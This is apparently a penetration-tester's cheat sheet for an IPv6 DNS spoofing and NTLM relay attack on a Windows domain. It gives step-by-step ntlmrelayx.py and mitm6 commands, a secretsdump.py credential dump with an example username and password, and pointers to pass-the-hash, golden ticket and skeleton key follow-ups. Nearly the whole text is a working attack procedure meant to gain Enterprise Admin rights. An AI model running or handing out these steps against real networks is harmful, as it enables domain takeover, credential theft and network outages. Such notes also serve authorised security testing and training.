By default IPv4 and IPv6 are enabled on a network but only IPv4 is used and has a DNS Service.
An attacker can spoof being an IPv6 DNS provider, allowing authentication to the Domain Controller via LDAP or SMB.
***THIS ATTACK CAN CAUSE NETWORK OUTAGES. ONLY PERFORM 5-10mins AT A TIME.***
# How to do it
## Step 1:
Start ntlmrelayx.
```bash
ntlmrelayx.py -6 -t ldaps://$(IP_ADDRESS) -wh [FAKE WPAD NAME HERE] -l [FOLDERNAME]
```
Example:
```bash
ntlmrelayx.py -6 -t ldaps://192.168.138.136 -wh fakewpad.marvel.local -l lootme
```
## Step 2:
Start mitm6.
```bash
sudo mitm6 -d $(DOMAIN)
```
Example:
```bash
sudo mitm6 -d marvel.local
```
## Step 3:
Go through the folder created by ntlmrelayx (e.g. lootme). Pay attention to users, descriptions and OS versions. If an account has barely ever/never been loggerd into, it could be a honeypot.
## Step 4:
Once events are triggered (e.g. a reboot), a user should be created on the DC with Enterprise Admin rights.
This user can be used with secretsdump.py to compromise the domain.
```bash
secretsdump.py $(DOMAIN)/$(USERNAME):'$(PASSWORD)'$(DC_IP_ADDRESS)
```
Example:
```bash
secretsdump.py juggernaut.local/miUBjARusF:'4HVsO.XO^S,:OuI'@172.16.1.5
```
Now that we have the domain admins hash, we could perform a pass-the-hash attack to get a foothold onto the DC and virtually do anything we want, such as: over-pass-the-hash, create a golden ticket, create a skeleton key, etc.
